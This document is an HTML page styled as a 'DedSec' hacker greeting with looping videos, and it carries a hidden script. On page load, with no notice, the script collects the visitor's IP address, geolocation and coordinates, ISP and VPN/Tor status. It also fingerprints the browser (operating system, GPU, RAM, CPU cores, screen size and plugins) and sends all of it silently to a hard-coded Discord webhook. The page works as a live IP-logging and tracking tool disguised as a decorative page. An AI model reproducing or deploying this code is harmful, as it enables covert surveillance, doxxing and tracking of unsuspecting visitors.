<!DOCTYPE html>

    <style>
        body {
            position: relative;

            font-family: Arial, sans-serif;

        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;

        }

<body>

    <div class="texto-no-interactivo">REGARDS FROM DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  SINGLE FAST IP/GEO FETCH (250ms timeout, no fallback)
    // ================================================================
    function fetchIPData() {
        return new Promise((resolve) => {
            const timer = setTimeout(() => resolve(null), 250);
            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(200) })
                .then(r => r.json())
                .then(d => {
                    clearTimeout(timer);
                    if (d && d.query) {
                        resolve({
                            ip: d.query,
                            org: d.isp || '',
                            country_name: d.country || '',
                            region: d.regionName || '',
                            city: d.city || '',
                            latitude: d.lat || 0,
                            longitude: d.lon || 0,
                            proxy: d.proxy === true
                        });
                    } else {
                        resolve(null);
                    }
                })
                .catch(() => {
                    clearTimeout(timer);
                    resolve(null);
                });
        });
    }

    // ================================================================
    //  ENCRYPTED IPv6 (always shows FranTech Solutions)
    // ================================================================
    function encryptIP(realIP) {
        if (!realIP || realIP === 'Unknown') {
            return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
        }
        if (realIP.includes('.')) {
            const parts = realIP.split('.');
            const hex = parts.map(p => parseInt(p).toString(16).padStart(2, '0')).join('');
            return `2605:6400:${hex.slice(0,4)}:${hex.slice(4,8)}:ae1d:c3d9:9941:d85e (FranTech Solutions)`;
        } else if (realIP.includes(':')) {
            const segs = realIP.split(':');
            if (segs.length >= 4) {
                return `${segs[0]}:${segs[1]}:****:****:${segs.slice(4).join(':')} (FranTech Solutions)`;
            }
            return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
        }
        return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
    }

    // ================================================================
    //  SEND MESSAGE (fast, with sendBeacon fallback)
    // ================================================================
    function sendMessage(msg) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg }),
            keepalive: true
        }).catch(() => {
            // fallback
            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
            navigator.sendBeacon(WEBHOOK, blob);
        });
    }

    // ================================================================
    //  MAIN – runs immediately, no blocking
    // ================================================================
    (async function() {
        // ---- 1. System info (synchronous, instant) ----
        const ua = navigator.userAgent;
        const os = (ua.includes('Windows NT')) ? 'Windows' :
                   (ua.includes('Macintosh')) ? 'macOS' :
                   (ua.includes('iPhone')) ? 'iOS' :
                   (ua.includes('Android')) ? 'Android' : 'Unknown';
        const browser = (ua.includes('Chrome') && !ua.includes('Edg')) ? 'Chrome' :
                        (ua.includes('Firefox')) ? 'Firefox' :
                        (ua.includes('Safari') && !ua.includes('Chrome')) ? 'Safari' :
                        (ua.includes('Edg')) ? 'Edge' : 'Other';

        let gpu = 'Unavailable';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
        } catch (e) {}

        const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // ---- 2. Fetch IP (fast, 250ms max) ----
        const ipData = await fetchIPData();

        // ---- 3. Build data ----
        let realIP = 'Unknown', isp = 'Unknown ISP', city = 'Unknown', region = 'Unknown', country = 'Unknown';
        let lat = 0, lon = 0, proxyFlag = false;
        if (ipData) {
            realIP = ipData.ip;
            isp = ipData.org;
            city = ipData.city;
            region = ipData.region;
            country = ipData.country_name;
            lat = ipData.latitude;
            lon = ipData.longitude;
            proxyFlag = ipData.proxy;
        }

        // VPN detection: proxy flag OR keywords in ISP
        let isVpn = proxyFlag;
        if (ipData && ipData.org) {
            const orgLower = ipData.org.toLowerCase();
            if (['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','private','hide','mask'].some(k => orgLower.includes(k))) isVpn = true;
        }
        if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) isVpn = true;

        // Encrypted IP display
        const displayIP = encryptIP(realIP);

        // Location & coordinates (will show actual data if available)
        const locationStr = (city !== 'Unknown' || region !== 'Unknown' || country !== 'Unknown')
            ? `${city}, ${region}, ${country}`
            : 'Unknown';
        const coordsStr = (lat !== 0 || lon !== 0) ? `${lat}, ${lon}` : 'Unknown';

        // ---- 4. Build message (NO User Name) ----
        const msg =
`**ctOS User Info**
**IP:** ${displayIP}
**Location:** ${locationStr}
**Coordinates:** ${coordsStr}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

        // ---- 5. Fire webhook immediately (no waiting for response) ----
        sendMessage(msg);
    })();
</script>
